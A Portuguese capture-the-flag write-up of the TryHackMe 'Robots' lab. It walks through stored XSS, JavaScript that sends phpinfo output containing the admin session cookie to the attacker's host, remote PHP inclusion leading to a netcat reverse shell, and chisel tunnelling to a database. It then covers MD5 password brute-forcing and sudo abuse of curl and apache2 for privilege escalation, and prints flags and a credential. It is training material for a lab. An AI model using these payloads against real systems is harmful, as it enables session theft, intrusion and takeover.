## Robots - A (small) tribute to I. Asimov.

[TryHackMe - Robots](https://tryhackme.com/room/robots)

Primeiramente, mapeio o IP da máquina alvo no meu arquivo `/etc/hosts`:

```bash
cat /etc/hosts
# Static table lookup for hostnames.
# See hosts(5) for details.
127.0.0.1        localhost
::1              localhost

10.10.56.148	     robots.thm
```

## Enumeração Inicial

Começo com o `rustscan` simples apenas para encontrar portas abertas.

```bash
rustscan -a robots.thm --ulimit 5000 --scripts none
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Port scanning: Making networking exciting since... whenever.

[~] The config file is expected to be at "/home/rt/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.66.24:9000
Open 10.10.66.24:80
Open 10.10.66.24:22
10.10.66.24 -> [9000,80,22]
```

Encontramos 3 portas abertas: 22, 80 e 9000.

Agora rodo o scan novamente, porém apenas nas portas já encontradas. Dessa vez também habilito a opção de execução de scripts do `nmap` para enumerar possíveis serviços.

```bash
rustscan -a robots.thm -p22,80,9000 --ulimit 5000 -- -T4 -n -sC -sV -Pn
...
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.9p1 (protocol 2.0)
80/tcp   open  http    syn-ack Apache httpd 2.4.61
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.61 (Debian)
|_http-title: 403 Forbidden
| http-robots.txt: 3 disallowed entries
|_/harming/humans /ignoring/human/orders /harm/to/self
9000/tcp open  http    syn-ack Apache httpd 2.4.52 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: Host: robots.thm
```

Resumidamente temos:

- 22 (`SSH`)
- 80 (`HTTP`)
- 9000 (`HTTP`)

## Exploração Manual

Visitando a `http://robots.thm:9000/`, encontramos a página default do Apache2 rodando numa máquina Ubuntu:

![Default page apache on ubuntu](/notes/writeups-robots-images/apache-ubuntu-default.png)

Visitando a `http://robots.thm:80/`, recebemos um status Forbidden (`403`):

![Forbidden on root](/notes/writeups-robots-images/forbidden-on-root.png)

Se observarmos o output do `nmap` encontramos um `robots.txt` com o seguinte conteúdo:

```bash
$ curl -s 'http://robots.thm/robots.txt'
Disallow: /harming/humans
Disallow: /ignoring/human/orders
Disallow: /harm/to/self
```

Enquanto a `/harming/humans/` e `/ignoring/human/orders/` retornam Forbidden (`403`):

```bash
curl -s "http://robots.thm/harming/humans" | head -n4
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>301 Moved Permanently</title>
</head><body>

curl -s "http://robots.thm/ignoring/human/orders" | head -n4
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>301 Moved Permanently</title>
</head><body>
```

a rota `/harm/to/self/` retorna OK (`200`):

```bash
curl -I http://robots.thm/harm/to/self/
HTTP/1.1 200 OK
Date: Fri, 25 Jul 2025 01:12:48 GMT
Server: Apache/2.4.61 (Debian)
X-Powered-By: PHP/8.3.10
Set-Cookie: PHPSESSID=bfu4qi5uql3oup3m2alr3a51vr; path=/; HttpOnly
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Type: text/html; charset=UTF-8
```

Então visitando a `http://robots.thm/harm/to/self/`, encontramos uma página com links para
se register e login. Essa página tem um detalhe, uma mensagem interessante:

> "An admin monitors new users."

![Home Page](/notes/writeups-robots-images/home-page.png)

Isso, futuramente, pode virar um XSS. Mas vamos seguir.

Na página de registro de usuário temos a seguinte dica:

> "Your initial password will be md5(username+ddmm)

![Register Page](/notes/writeups-robots-images/register.png)

Então, seguindo as instruções, com essas credênciais:

```bash
Username: rt
Date of Birth: 01/01/2020
```

Essa deveria ser minha senha:

```bash
echo -n "rt0101" | md5sum
cd6f4d260b3ed4bf8d3e84258bda406c  -
```

Vamos seguir com a autênticação. Logado.

Depois de logar, caimos nessa página:

![After Login Page](/notes/writeups-robots-images/after-login-page.png)

Pontos interessantes dessa página:

- Uma lista dos últimos logins com o **username refletido** na página.
- Um link "Server Info" apontando para: `http://robots.thm/harm/to/self/server_info.php`

Visitando o `harm/to/self/server_info.php` encontramos uma página que mostra o `phpinfo()`.

![PHP Info](/notes/writeups-robots-images/php-info.png)

## Explorando Vulnerábilidades

Como já desconfiamos de um possível XSS, vamos começar por ele. Já que o username é refletido
na home page após o login, vamos tentar registar um usuário com o seguinte payload:

```html
<script>
  alert("xss");
</script>
```

Se a função `alert` for executada, temos um XSS.

Bingo! Temos um XSS:

![XSS Username Home Page](/notes/writeups-robots-images/xss-username-home-page.png)

Agora vamos pensar em uma maneira de usar isso ao nosso favor.
Revisitando o `server_info.php` podemos ver que é mostrado detalhes de sessão, incluíndo o PHPSESSID.

![PHP Session ID Exposed](/notes/writeups-robots-images/php-session-id.png)

Olhando para o nosso cookie de sessão, infelizmente está marcado como `httpOnly`. Então não conseguimos
roubar esse token usando javascript de forma convencional (`document.cookie`).

![Session ID HTTPOnly](/notes/writeups-robots-images/session-id-cookie.png)

Porém temos outras maneiras de acessar esse token e este artigo abaixo nos mostra como fazer o bypass do `httpOnly`.

> [Stealing session ids with phpinfo() and how to stop it](https://www.michalspacek.com/stealing-session-ids-with-phpinfo-and-how-to-stop-it)

Então, vamos tentar...

A estratégia será a seguinte:

- Vamos escrever um script em JS que ao ser processado, obtenha o conteúdo do arquivo `/harm/to/self/server_info.php` e envie esse conteúdo (base64) para um servidor web que está escutando em uma porta, assim podemos fazer decode do base64;
- Vamos acionar o XSS fazendo com que esse script seja obtido da nossa máquina e executado na máquina alvo;

Vamos começar escrevendo o script JS:

```javascript
async function get_server_info() {
  const response = await fetch("/harm/to/self/server_info.php");
  const text = await response.text();

  await fetch("http://<seu-ip-da-vpn>:4444/server_info", {
    method: "POST",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded",
    },
    body: `data=${btoa(text)}`,
  });
}

get_server_info();
```

Nosso username vai ser:

```html
<script src="http://<seu-ip-da-vpn>/get_server_info.js"></script>
```

Isso deve fazer com que a máquina alvo tente buscar o script js em minha máquina, então vou precisar
subir um servidor web pra isso. Hoje vou optar pelo python (simplicidade):

```bash
sudo python3 -m http.server 80
```

Assim que fizermos o login, á maquina alvo tentará executar o script e mandar o POST request, para a
minha máquina na porta 4444, então vamos subir um netcat aqui:

```bash
sudo nc -lvnp 4444
```

No netcat devo obter o conteúdo em base64 do arquivo. Então é só decodar e pegar o PHPSESSID do admin e substituir no nosso token de sessão.

## Execução

Subindo o servidor python na porta 80 em minha máquina:

```bash
sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Subindo o netcat na porta 4444 em minha máquina:

```bash
sudo nc -lvnp 4444
```

Usuário registrado e podemos ver que nosso arquivo get_server_info.js foi requisitado:

```bash
sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.56.148 - - [24/Jul/2025 23:10:38] "GET /get_server_info.js HTTP/1.1" 200 -
```

também podemos notar a seguinte conexão no terminal do netcat:

```bash
sudo nc -lvnp 4444
Connection from 10.10.56.148:48438
POST /server_info HTTP/1.1
Host: 10.6.61.234:4444
Connection: keep-alive
Content-Length: 99145
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/127.0.6533.119 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: http://robots.thm
Referer: http://robots.thm/
Accept-Encoding: gzip, deflate

data=PCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBYSFRNTCAxLjAgVHJhbnNpdGlvbmFs[Conteúdo Omitido...]
```

Copiei o conteúdo do `data`, savei em outro arquivo e fiz o decode para html:

```bash
cat base64.txt | base64 -d >> server_info.html
```

Agora temos o server info, gerado pelo admin, olhando para o HTTP COOKIE:

![PHP Session Admin](/notes/writeups-robots-images/php-session-admin.png)

Substituindo esse valor no nosso token pelo navegador, viramos admin!!

A primeiro momento não vamos notar nada, porém ao dar refresh na página, podemos ver a lista dos
outros usuários logados:

![Admin View](/notes/writeups-robots-images/admin-view.png)

Para mais tricks com XSS, podemos consultar: [XSS - HackTricks](https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/index.html?highlight=steal-page-content#steal-page-content)

## Enumeração de Diretórios

Bom, e agora, para onde podemos ir? Já que sou admin, teóricamente posso navegar por todo o site agora, porém como? Não conheço os caminhos. Vamos descobri-los então.

Nesse caso, irei utilizar o [Gobuster](https://github.com/OJ/gobuster) para fazer fuzzing de diretórios para páginas e encontrar algo, você pode utilizar qualquer outro da sua preferências: dirb, dirbuster, ffuf. Também iremos precisar de uma wordlist para o gobuster saber quais diretórios/paginas tentar, aqui vou utilizar a `directory-list-2.3-small.txt` do repositório: [SecLists](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt), já fica a dica, esse repo têm varias wordlists interessantes.

```bash
gobuster dir --url http://robots.thm/harm/to/self/ -w directory-list-2.3-small.txt -t 100 -x php
===============================================================
Gobuster v3.7
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://robots.thm/harm/to/self/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.7
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 662]
/register.php         (Status: 200) [Size: 976]
/login.php            (Status: 200) [Size: 795]
/admin.php            (Status: 200) [Size: 370]
/css                  (Status: 301) [Size: 319] [--> http://robots.thm/harm/to/self/css/]
/logout.php           (Status: 302) [Size: 0] [--> index.php]
/config.php           (Status: 200) [Size: 0]
Progress: 175324 / 175324 (100.00%)
===============================================================
Finished
===============================================================
```

Uma página chama muito a atenção: `admin.php`.

## Próxima fase de descoberta e exploração de vúlnerabilidades

Acessando a `/harm/to/self/css/admin.php`, vemos apeas um input com um botão de submit para testar URLs:

![Teste URL Page](/notes/writeups-robots-images/test-url-page.png)

Vamos testar a nossa URL como servidor python rodando novamente:

Ao fazer o submit vemos que ele acessou o nosso diretório e listou os nossos arquivos:

```bash
sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.56.148 - - [24/Jul/2025 23:46:22] "GET / HTTP/1.1" 200 -
```

![Directory listing](/notes/writeups-robots-images/dir-listing.png)

Observando esse comportamento, podemos criar algum arquivo PHP com um comando e ver se a máquina alvo executa. Criando o arquivo whoiam.php

```php
<?php
  system('whoami');
?>
```

O servidor pegou o arquivo da minha máquina e executou:

```bash
10.10.56.148 - - [24/Jul/2025 23:50:05] "GET /whoiam.php HTTP/1.1" 200 -
```

![Who am i result](/notes/writeups-robots-images/who-am-i-result.png)

Já que a nossa máquina alvo está executando nossos comandos, está na hora de um Reverse Shell. Vamos spawnar uma conexão da máquina alvo para minha maquina e escutar com netcat. Vou usar esse Reverse Shell de PHP: [PentestMonkey Rev Shell - PHP](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php), ajustar as variáveis e abrir uma conexão netcat seguindo essas variaveis.

Nosso script foi requisitado:

```bash
10.10.56.148 - - [24/Jul/2025 23:56:08] "GET /php-reverse-shell.php HTTP/1.1" 200 -
```

E já bateu a conexão no netcat:

```bash
sudo nc -lvnp 445
Connection from 10.10.56.148:55490
Linux robots.thm 5.15.0-118-generic #128-Ubuntu SMP Fri Jul 5 09:28:59 UTC 2024 x86_64 GNU/Linux
 02:56:09 up  1:50,  0 user,  load average: 0.00, 0.06, 0.11
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Podemos fazer o upgrade do shell seguindo esse guia: [Upgrade to Fully Interactive TTYs](https://0xffsec.com/handbook/shells/full-tty/)

## Exploração interna

Podemos navegar até o diretório que estavamos `/var/www/html/harm/to/self` e ver se tem algo interessante.

`cd /var/www/html/harm/to/self`

```bash
www-data@robots:/var/www/html/harm/to/self$ ls
admin.php   css        login.php   register.php
config.php  index.php  logout.php  server_info.php
```

Vamos olhar o `config.php`:

```bash
www-data@robots:/var/www/html/harm/to/self$ cat config.ph
cat config.ph
cat: config.ph: No such file or directory
www-data@robots:/var/www/html/harm/to/self$ cat config.php
cat config.php
<?php
    $servername = "db";
    $username = "robots";
    $password = "omitido";
    $dbname = "web";
// Get the current hostname
$currentHostname = $_SERVER['HTTP_HOST'];

// Define the desired hostname
$desiredHostname = 'robots.thm';

// Check if the current hostname does not match the desired hostname
if ($currentHostname !== $desiredHostname) {
    // Redirect to the desired hostname
    header("Location: http://$desiredHostname" . $_SERVER['REQUEST_URI']);
    exit();
}
ini_set('session.cookie_httponly', 1);

session_start();

?>
```

A variável `$servername = "db";` corresponde a um host que não conhecemos então podemos descobrir usando o seguinte comando:

`getent hosts db`

Esse comando vai buscar no arquivo /etc/hosts o mapemento para db:

```bash
www-data@robots:/var/www/html/harm/to/self$ getent hosts db
172.18.0.3      db
```

> Obs: Esse IP parece ser de containers docker.

Agora temos as credênciais do banco de dados, só temos um problema, a máquina alvo não possuí o comando `mysql`, nem `mariadb`... Nesse caso, uma solução elegante é usar **port forwarding reverso** para expor o serviço MySQL para minha máquina local.

Aqui vou utilizar o [Chisel](https://github.com/jpillora/chisel).

Feito o download do `Chisel` vou iniciar em minha máquina:

```bash
./chisel server -p 7777 --reverse
2025/07/25 00:14:54 server: Reverse tunnelling enabled
2025/07/25 00:14:54 server: Fingerprint H30B6ZZqTT5WzTISSkazJYO+gj8ikfAi8bHjyttlOv0=
2025/07/25 00:14:54 server: Listening on http://0.0.0.0:7777
```

Como a máquina alvo não tem o `Chisel` vou transfeir usando o cURL (aproveitar que já tem um web server em python rodando)

```bash
www-data@robots:/var/www/html/harm/to/self$ curl -s http://10.6.61.234/chisel -o /tmp/chisel

www-data@robots:/var/www/html/harm/to/self$ chmod +x /tmp/chisel

www-data@robots:/var/www/html/harm/to/self$ /tmp/chisel client 10.6.61.234:7777 R:3306:172.18.0.3:3306 &
[1] 543

www-data@robots:/var/www/html/harm/to/self$ 2025/07/25 03:18:53 client: Connecting to ws://10.6.61.234:7777
2025/07/25 03:18:56 client: Connected (Latency 375.617993ms)
```

Agora, da nossa máquina, podemos acessar o banco com as credências já obtidas:

```bash
mysql -u robots -pq4qCz1OflKvKwK4S -h 127.0.0.1 -D web

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 275
Server version: 11.5.2-MariaDB-ubu2404 mariadb.org binary distribution

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [web]>
```

```bash
MariaDB [web]> select * from users;
+----+---------------------------------------------------------------+----------------------------------+---------+
| id | username                                                      | password                         | group   |
+----+---------------------------------------------------------------+----------------------------------+---------+
|  1 | admin                                                         | 3e3d6c2d540d49b1a11cf74ac5a37233 | admin   |
|  2 | rgiskard                                                      | ******************************** | nologin |
|  3 | rt                                                            | 7db1d2f3d282542902cb0c4fff189a2b | guest   |
|  4 | <script>alert('xss')</script>                                 | 726d1bae31c7239855322a4e675a4252 | guest   |
|  5 | <script src="http://10.6.61.234/get_server_info.js"></script> | 80423edb24e73f46069918d89006af43 | guest   |
+----+---------------------------------------------------------------+----------------------------------+---------+

5 rows in set (0.324 sec)
```

## Quebrando os Hashes

Antes de quebrar esses Hashes, vamos checar o login.php pra ver se não temos mais nenhuma "criptográfia":

```bash
if (isset($_POST['username'])&&isset($_POST['password'])) {
    $stmt = $pdo->prepare('SELECT * from users where (username= ? and password=md5(?) and `group` NOT LIKE "nologin")');

    $stmt->execute([$_POST['username'], $_POST['password']]);

    if ($stmt->rowCount() === 1 ) {
    $row=$stmt->fetch();
      $_SESSION['logged_in']=true;
      $_SESSION['username']=$_POST['username'];

      $stmt = $pdo->prepare('INSERT INTO logins values ( ?, NOW())');
      $stmt->execute([$_POST['username']]);

      header('Location: index.php');
      die();
  }
}
```

Acredito que não, seria só isso mesmo.

Já conhecemos como esses hash são criados (md5(username+ddmm)), então podemos fazer algum script para fazer a operação reversa já que dias e meses tem limites.

```python
import hashlib
import sys

def gerar_hashes(texto):
    primeiro = hashlib.md5(texto.encode()).hexdigest()
    segundo = hashlib.md5(primeiro.encode()).hexdigest()
    return primeiro, segundo

def testar(usuario, hash_alvo):
    for dia in range(1, 32):
        for mes in range(1, 13):
            data = f"{dia:02d}{mes:02d}"
            combinado = usuario + data
            h1, h2 = gerar_hashes(combinado)
            if h2 == hash_alvo:
                print("Encontrado!")
                print(f"→ Entrada: {combinado}")
                print(f"→ Primeiro hash: {h1}")
                print(f"→ Hash duplo:    {h2}")
                return
    print("Nenhuma combinação deu certo.")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Uso: python script.py <usuario> <hash_alvo>")
        sys.exit(1)

    usuario = sys.argv[1]
    alvo = sys.argv[2]
    testar(usuario, alvo)
```

```bash
python brute-force-pass.py rgiskard dfb35334bf2a1338fa40e5fbb4ae4753

python brute-force-pass.py rgiskard dfb35334bf2a1338fa40e5fbb4ae4753
Encontrado!
→ Entrada: rgiskard2209
→ Primeiro hash: b246f21ff68cae9503ed6d18edd32dae
→ Hash duplo:    dfb35334bf2a1338fa40e5fbb4ae4753
```

Agora temos o usuário e senha do rgiskard. Vamos logar via SSH:

```bash
ssh rgiskard@robots.thm
rgiskard@robots.thm's password:
rgiskard@ubuntu-jammy:~$ id
uid=1002(rgiskard) gid=1002(rgiskard) groups=1002(rgiskard)
```

## Elevação de privilégios para o usuário dolivaw

Verificando os privilégios do usuário rgiskard:

```bash
rgiskard@ubuntu-jammy:~$ sudo -l
[sudo] password for rgiskard:
Matching Defaults entries for rgiskard on ubuntu-jammy:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User rgiskard may run the following commands on ubuntu-jammy:
    (dolivaw) /usr/bin/curl 127.0.0.1/*
```

Vemos que podemos rodar o curl em 127.0.0.1/\* com o usuário `dolivaw`.

Aqui podemos fazer um trick para pegar o user.txt que está no /home do `dolivaw`.

Podemos usar o `cURL` e passar o parametro `file:` para obter qualquer arquivo que o
`dolivaw` possa ler.

```bash
rgiskard@ubuntu-jammy:~$ sudo -u dolivaw /usr/bin/curl 127.0.0.1/ file:///home/dolivaw/user.txt
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
<hr>
<address>Apache/2.4.61 (Debian) Server at 127.0.0.1 Port 80</address>
</body></html>
THM{9b17d3c3e86c944c868c57b5a7fa07d8}
```

Isso pode resolver uma questão do CTF, mas o que queremos de verdade é o shell do `dolivaw`.

Para isso o `cURL` também nos permite savar as respostas das requisições em um arquivo
usando a opção -o. Então podemos usar isso para escrever uma chave SSH publica no
`authorized_keys` do dolivaw e posteriormente logar via SSH com a chave privada.

Primeiro geramos um par de chaves: (aproveitar que já estamos com o webserver aberto):

```bash
ssh-keygen -f id_ed25519 -t ed25519
```

Agora da máquina alvo, vamos fazer um curl, pegar a nossa chave pública (.pub) e escrever no `/home/dolivaw/.ssh/authorized_keys`

```bash
sudo -u dolivaw /usr/bin/curl 127.0.0.1/ http://10.6.61.234/id_ed25519.pub -o /tmp/1 -o /home/dolivaw/.ssh/authorized_keys
```

Aqui tem um outro trick: quando passamos o primeiro `-o /tmp/1` ele é correspondente ao primeiro request (`127.0.0.1`) e o segundo `-o /home/dolivaw/.ssh/authorized_keys` corresponde ao segundo request: `http://10.6.61.234/id_ed25519.pub`.

Feito isso, podemos logar com a nossa chave privada:

```bash
ssh -i id_ed25519 dolivaw@robots.thm
dolivaw@ubuntu-jammy:~$ id
uid=1003(dolivaw) gid=1003(dolivaw) groups=1003(dolivaw)
```

## Elevação de privilégios para o usuário root

Verificando os privilégios do usuário rgiskard:

```bash
dolivaw@ubuntu-jammy:~$ sudo -l
Matching Defaults entries for dolivaw on ubuntu-jammy:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User dolivaw may run the following commands on ubuntu-jammy:
    (ALL) NOPASSWD: /usr/sbin/apache2
```

Aqui podemos rodar o `/usr/sbin/apache2` como root. Consultando o [GTFOBins - apache2ctl](https://gtfobins.github.io/gtfobins/apache2ctl/), temos algumas opções:

![gtfobins-apache2ctl](/notes/writeups-robots-images/gtfobins-apache2ctl.png)

Tentei o segundo método sugerido, porém obtive um erro:

```bash
dolivaw@ubuntu-jammy:~$ LFILE=/root/root.txt
dolivaw@ubuntu-jammy:~$ sudo -u root apache2 -c "Include $LFILE" -k stop
[Fri Jul 25 04:14:12.845551 2025] [core:warn] [pid 1600] AH00111: Config variable ${APACHE_RUN_DIR} is not defined
apache2: Syntax error on line 80 of /etc/apache2/apache2.conf: DefaultRuntimeDir must be a valid directory, absolute or relative to ServerRoot
```

O problema é que a variavel APACHE_RUN_DIR não estava definida.

Tentando novamente, agora definido a variavel que faltou:

```bash
$ sudo -u root /usr/sbin/apache2 -C "Define APACHE_RUN_DIR /tmp" -C "Include $LFILE" -k stop
[Fri Jul 25 04:16:29.709941 2025] [core:warn] [pid 1610] AH00111: Config variable ${APACHE_PID_FILE} is not defined
[Fri Jul 25 04:16:29.710005 2025] [core:warn] [pid 1610] AH00111: Config variable ${APACHE_RUN_USER} is not defined
[Fri Jul 25 04:16:29.710016 2025] [core:warn] [pid 1610] AH00111: Config variable ${APACHE_RUN_GROUP} is not defined
[Fri Jul 25 04:16:29.710032 2025] [core:warn] [pid 1610] AH00111: Config variable ${APACHE_LOG_DIR} is not defined
[Fri Jul 25 04:16:29.713120 2025] [core:warn] [pid 1610:tid 140677970921344] AH00111: Config variable ${APACHE_LOG_DIR} is not defined
[Fri Jul 25 04:16:29.713284 2025] [core:warn] [pid 1610:tid 140677970921344] AH00111: Config variable ${APACHE_LOG_DIR} is not defined
[Fri Jul 25 04:16:29.713303 2025] [core:warn] [pid 1610:tid 140677970921344] AH00111: Config variable ${APACHE_LOG_DIR} is not defined
AH00526: Syntax error on line 1 of /root/root.txt:
Invalid command 'THM{2a279561f5eea907f7617df3982cee24}', perhaps misspelled or defined by a module not included in the server configuration
```

Agora temos todas as flags e a máquina foi ownada.

Daria pra continuar aqui tentando pegar o Shell com o Root seguindo dicas do criador da sala:
[The original idea for privesc: arbitrary file write using apache](https://enricocavalli.github.io/writeups/THM/Robots-room-official-writeup#the-original-idea-for-privesc-arbitrary-file-write-using-apache), mas acho que para o meu primeiro writeup documentado está ok.
